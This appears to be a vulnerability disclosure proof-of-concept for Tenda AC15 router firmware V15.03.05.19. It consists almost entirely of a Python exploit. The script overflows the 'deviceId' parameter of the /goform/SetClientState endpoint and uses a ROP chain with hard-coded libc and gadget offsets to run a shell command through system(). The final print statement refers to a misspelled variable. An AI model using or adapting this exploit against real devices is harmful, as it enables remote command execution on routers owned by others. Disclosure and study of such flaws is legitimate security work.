Affected products: AC15V15.03.05.19

POC:

import requests
from pwn import *
cmd=b"echo hello! "
libc_base=0xf659c000


system_offset = 0x5a270
gadget1_offset = 0x18298
gadget2_offset = 0x40cb8
system_addr = libc_base + system_offset
gadget1 = libc_base + gadget1_offset
gadget2 = libc_base + gadget2_offset

#cmd=bin_sh+libc_base
payload="A"*590 +p32(gadget1)+p32(system_addr) +p32(gadget2)+cmd
url="http://192.168.0.119/goform/SetClientState"
cookie={"Cookie":"password=12345"}
data={"limitEn":"1","deviceId":payload,"limitSpeedUp":"a","limitSpeed":"a"}

reponse=requests.post(url,cookies=cookie,data=data)

print(response.text)

